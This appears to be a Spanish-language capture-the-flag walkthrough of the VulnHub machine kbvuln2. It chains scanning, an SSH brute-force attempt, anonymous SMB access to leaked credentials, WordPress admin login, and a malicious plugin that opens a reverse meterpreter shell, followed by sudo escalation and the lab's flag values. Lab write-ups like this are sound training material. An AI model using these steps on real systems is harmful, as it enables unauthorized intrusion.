@@ -1,0 +1,208 @@
+<p>https://www.youtube.com/watch?v=WhLngRlmMrA
+https://github.com/wetw0rk/malicious-wordpress-plugin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una máquina con varios puertos abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al servidor web con la dirección 192.168.122.6, saldrá la web por defecto de Apache</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar gobuster para ver directorios ocultos, mostrará como resultado varios directorios, entre ellos uno llamado wordpress</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.6 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Enumerar los usuarios de la web de wordpress, solo encontrará el usuario admin</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan <span class="nt">--url</span> 192.168.122.6/wordpress <span class="nt">-e</span> u
+</code></pre></div></div>
+
+<p>Usuario: Anonymous
+Contraseña: Vacía</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/5.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Lanzar un ataque de fuerza bruta para encontrar la contraseña del usuario admin, no dará resultado</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Buscar usuarios en el sistema, solo encontrará kbadmin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/8.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Intentar un ataque de fuerza bruta para conseguir la contraseña, no dará resultado</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-l</span> kbadmin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.122.6 ssh
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver directorios compartidos por smb</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span>  192.168.122.6
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al directorio de Anonymous y mostrar el contenido</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //192.168.122.6/Anonymous
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Descargar el archivo backup.zip</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get backup.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Moverlo a un nuevo directorio y descomprimirlo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>kbvuln2
+<span class="nb">mv </span>backup.zip kbvuln2/
+<span class="nb">ls
+</span>unzip backup.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/14.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Creará un directorio llamado wordpress y un archivo llamado <code class="language-plaintext highlighter-rouge">remember_me.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo remember_me.txt, mostrará un usuario y contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/17.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al login de la web de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar la direccion DNS del action del formulario.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Añadir el dominio dns al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Recargar el sitio, ahora se verá correctamente</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Colocar el usuario y contraseña y dar en Log In</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al editor de temas de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Editar el archivo 404 con un script de reverse_php</p>
+
+<p>Preparar un plugin que hará un shell inverso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~/Downloads/repos
+
+git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git
+
+<span class="nb">cd </span>malicious-wordpress-plugin
+
+Python wordpwn.py 192.168.122.5 4444 Y
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Se pondrá de forma automática en escucha</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Y se creará un archivo zip</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/26.png" alt="image-center" class="align-center" /></p>
+
+<p>Subir el plugin al sitio de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/27.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Activar el plugin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/29.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al editor de plugins y seleccionar GotEm</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/30.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a la ruta del plugin
+<code class="language-plaintext highlighter-rouge">http://192.168.122.6/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/31.png" alt="image-center" class="align-center" /></p>
+
+<p>Se abrirá un shell inverso con meterpreter</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/32.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar a shell y ver el usuario</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/33.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio home del usuario kbadmin y mostrar el contenido, luego leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<p>Dará la flag del usuario</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/34.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a /var/www/html y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/35.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido de read_ME.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/36.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido del archivo remember_me.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/37.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de acceder por ssh al usuario kbadmin con esa contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/38.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver los permisos del usuario kbadmin usando el comando <code class="language-plaintext highlighter-rouge">sudo –l</code>, mostrará que tiene todos los permisos por lo que puede cambiar al usuario root sin necesidad de introducir contraseña.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/39.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/40.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio de root y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/41.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el contenido de flag.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/42.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>Usuario: 03bf4d20dac5644c75e69e40bad48db0</p>
+
+<p>Root: dc387b4cf1a4143f562dd1bdb3790ff1</p>
